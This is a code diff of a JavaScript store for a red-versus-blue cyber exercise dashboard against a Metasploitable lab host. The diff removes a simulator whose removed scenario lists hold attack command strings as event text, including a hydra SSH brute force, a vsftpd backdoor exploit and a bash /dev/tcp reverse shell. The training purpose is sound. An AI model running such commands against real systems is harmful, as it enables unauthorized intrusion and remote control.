@@ -3,49 +3,13 @@ import { randomUUID } from "crypto";
 const MAX_FEED = 40;
 const MAX_TIMELINE = 24;
 
-const RED_SCENARIOS = [
-  ["Network port scan", "T1046", "medium", "in_progress", "nmap -sV 192.168.56.101"],
-  ["SSH brute force attempt", "T1110", "high", "in_progress", "hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101"],
-  ["Exploit vsftpd backdoor", "T1210", "critical", "success", "msf exploit(unix/ftp/vsftpd_234_backdoor)"],
-  ["SMB enumeration", "T1135", "medium", "success", "enum4linux -a 192.168.56.101"],
-  ["Web directory brute force", "T1083", "low", "in_progress", "gobuster dir -u http://192.168.56.101"],
-  ["Reverse shell payload sent", "T1059", "critical", "success", "bash -i >& /dev/tcp/red-team-01/4444"],
-  ["Credential spray", "T1110", "high", "failed", "crackmapexec smb 192.168.56.101"],
-  ["Post-exploitation whoami", "T1033", "medium", "success", "whoami on compromised session"],
-];
-
-const BLUE_SCENARIOS = [
-  ["Alert triage started", null, "medium", "in_progress", "Reviewing SIEM notable for SSH failures"],
-  ["Acknowledged brute force alert", null, "high", "in_progress", "INC-001 assigned to Blue Analyst"],
-  ["Firewall block rule added", "T1562", "high", "success", "iptables -A INPUT -s 192.168.56.102 -j DROP"],
-  ["Investigation opened", null, "medium", "in_progress", "Timeline analysis on metasploitable auth.log"],
-  ["Escalated to incident commander", null, "high", "in_progress", "Severity raised to High"],
-  ["Isolated target from network", "T1562", "critical", "blocked", "VLAN quarantine applied to 192.168.56.101"],
-  ["Threat hunt query executed", "T1057", "low", "in_progress", "Search: failed auth + external src"],
-  ["Containment playbook step 3", null, "medium", "success", "Disabled vsftpd service on target"],
-];
-
-const TARGET_SCENARIOS = [
-  ["SSH authentication failure spike", null, "high", "detected", "sshd: Failed password for msfadmin"],
-  ["FTP anomalous login", null, "medium", "detected", "vsftpd: OOPS: vsftpd: missing value in config"],
-  ["Suspicious outbound connection", null, "critical", "detected", "NEW outbound TCP to 192.168.56.102:4444"],
-  ["Samba access from unknown host", null, "medium", "detected", "smbd: connection from red-team-01"],
-  ["Web server 404 scan pattern", null, "low", "detected", "apache: GET /admin /phpmyadmin /dvwa"],
-  ["New listener on high port", null, "critical", "detected", "netstat: LISTEN 0.0.0.0:6200"],
-];
-
 const PHASES = ["Reconnaissance", "Initial Access", "Exploitation", "Post-Exploitation", "Containment"];
-
-function pick(arr) {
-  return arr[Math.floor(Math.random() * arr.length)];
-}
 
 export class LiveStore {
   constructor() {
     this.onEvent = null;
     this._started = new Date();
     this._phase = PHASES[0];
-    this._tick = 0;
     this._redFeed = [];
     this._blueFeed = [];
     this._targetFeed = [];
@@ -53,7 +17,7 @@ export class LiveStore {
     this._redCount = 0;
     this._blueCount = 0;
     this._targetCount = 0;
-    this._openIncidents = 2;
+    this._openIncidents = 0;
     this._timeline = [];
     this._connectors = [
       {
@@ -62,8 +26,8 @@ export class LiveStore {
         role: "red",
         hostname: "red-team-01",
         ip: "192.168.56.102",
-        status: "connected",
-        last_event_at: new Date().toISOString(),
+        status: "disconnected",
+        last_event_at: null,
         event_rate_per_min: 0,
         data_types: ["attack", "recon", "exploit"],
       },
@@ -73,8 +37,8 @@ export class LiveStore {
         role: "blue",
         hostname: "blue-team-01",
         ip: "192.168.56.103",
-        status: "connected",
-        last_event_at: new Date().toISOString(),
+        status: "disconnected",
+        last_event_at: null,
         event_rate_per_min: 0,
         data_types: ["analyst", "response", "detection"],
       },
@@ -84,8 +48,8 @@ export class LiveStore {
         role: "target",
         hostname: "metasploitable",
         ip: "192.168.56.101",
-        status: "connected",
-        last_event_at: new Date().toISOString(),
+        status: "disconnected",
+        last_event_at: null,
         event_rate_per_min: 0,
         data_types: ["auth", "syslog", "service"],
       },
@@ -93,25 +57,11 @@ export class LiveStore {
     this._asset = {
       hostname: "metasploitable",
       ip: "192.168.56.101",
-      risk_level: "high",
-      alerts_open: 4,
+      risk_level: "low",
+      alerts_open: 0,
       services_at_risk: ["ssh", "ftp", "smb", "http"],
       contained: false,
     };
-    this._initTimeline();
-  }
-
-  _initTimeline() {
-    const now = Date.now();
-    for (let i = 0; i < MAX_TIMELINE; i++) {
-      const t = new Date(now - (MAX_TIMELINE - i) * 5 * 60000);
-      this._timeline.push({
-        time: t.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false }),
-        red: Math.max(0, 2 + (i % 5) - 2),
-        blue: Math.max(0, 1 + (i % 4) - 1),
-        target: Math.max(0, 3 + (i % 6) - 2),
-      });
-    }
   }
 
   async publishEvent(raw) {
@@ -121,7 +71,7 @@ export class LiveStore {
       team: raw.team,
       actor: raw.actor,
       action: raw.action,
-      target: raw.target || "metasploitable (192.168.56.101)",
+      target: raw.target || "metasploitable",
       severity: raw.severity || "medium",
       outcome: raw.outcome || "in_progress",
       mitre_id: raw.mitre_id ?? null,
@@ -236,75 +186,5 @@ export class LiveStore {
         updates: 0,
       },
     };
-  }
-}
-
-export class ExerciseSimulator {
-  constructor(store, intervalSec = 3.5) {
-    this.store = store;
-    this.intervalSec = intervalSec;
-    this._timer = null;
-    this._tick = 0;
-  }
-
-  start() {
-    const tick = async () => {
-      this._tick++;
-      if (this._tick % 12 === 0) {
-        const idx = Math.min(PHASES.length - 1, Math.floor(this._tick / 12));
-        this.store.setPhase(PHASES[idx]);
-      }
-      const roll = Math.random();
-      if (roll < 0.42) await this._emitRed();
-      else if (roll < 0.78) await this._emitBlue();
-      else await this._emitTarget();
-    };
-    tick();
-    this._timer = setInterval(tick, this.intervalSec * 1000);
-  }
-
-  async _emitRed() {
-    const [action, mitre, severity, outcome, message] = pick(RED_SCENARIOS);
-    await this.store.publishEvent({
-      team: "red",
-      actor: "Red Operator",
-      action,
-      target: "metasploitable (192.168.56.101)",
-      severity,
-      outcome,
-      mitre_id: mitre,
-      source_host: "red-team-01",
-      message,
-    });
-  }
-
-  async _emitBlue() {
-    const [action, mitre, severity, outcome, message] = pick(BLUE_SCENARIOS);
-    await this.store.publishEvent({
-      team: "blue",
-      actor: "Blue Analyst",
-      action,
-      target: "metasploitable (192.168.56.101)",
-      severity,
-      outcome,
-      mitre_id: mitre,
-      source_host: "blue-team-01",
-      message,
-    });
-  }
-
-  async _emitTarget() {
-    const [action, mitre, severity, outcome, message] = pick(TARGET_SCENARIOS);
-    await this.store.publishEvent({
-      team: "target",
-      actor: "metasploitable",
-      action,
-      target: "metasploitable (192.168.56.101)",
-      severity,
-      outcome,
-      mitre_id: mitre,
-      source_host: "metasploitable",
-      message,
-    });
   }
 }
